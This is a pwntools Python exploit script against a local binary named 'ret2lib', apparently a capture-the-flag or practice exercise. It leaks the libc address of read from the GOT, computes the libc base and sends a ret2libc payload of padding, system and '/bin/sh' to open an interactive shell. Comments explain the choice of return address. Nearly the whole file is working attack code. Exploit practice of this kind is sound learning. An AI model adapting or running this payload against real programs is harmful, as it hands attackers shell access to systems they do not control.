#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./ret2lib')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.log_level = 'debug'
context.delete_corefiles = True

# -- Exploit goes here --

io = start()

eip_offset = 60
call_edx = 0x080484d3


io.sendlineafter(':', str(exe.got.read))
io.recvuntil(': ')
libc_read_addr = int(io.recvline()[:-1], base=16)
info("leaked libc address = %x", libc_read_addr)

libc = ELF('/usr/lib32/libc.so.6')
libc.address = libc_read_addr - libc.symbols.read
info("libc base address @ %x", libc.address)

payload = flat(
    asm('nop') * (eip_offset),
    p32(libc.symbols.system),
    p32(libc.symbols.read), # since we're jumping and not placing a call, we'll have to store a return address here
    # some ret2libc blogs mention that placing a valid address here is not necessary
    # I found that not placing a valid return address resulted in non persistent shell
    # You can place any address in place of read!
    # for all intents and purposes you can place system address there again!
    p32(next(libc.search(b"/bin/sh"))),
)

io.sendlineafter(":", payload)
io.recv()

io.interactive()
